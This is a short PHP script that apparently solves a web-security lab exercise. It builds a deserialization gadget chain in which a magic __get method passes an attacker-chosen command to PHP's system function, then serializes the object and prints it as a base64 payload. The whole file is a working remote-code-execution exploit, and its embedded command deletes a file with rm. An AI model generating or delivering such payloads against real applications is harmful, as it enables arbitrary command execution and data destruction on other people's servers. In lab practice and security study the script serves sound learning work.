<?php
class CustomTemplate {
    private $default_desc_type;
    private $desc;
    public $product;

    public function __construct($desc_type='HTML_DESC') {
        $this->desc = new DefaultMap("system");
        $this->default_desc_type = $desc_type;
    }
}
class DefaultMap {
    private $callback;

    public function __construct($callback) {
        $this->callback = $callback;
    }

    public function __get($name) {
        return call_user_func($this->callback, $name);
    }
}
$CustomTemplate = new CustomTemplate("rm /home/carlos/morale.txt");
$payload = serialize($CustomTemplate);
echo "[+] Base64 Encoded Payload: " . base64_encode($payload) . "\n";
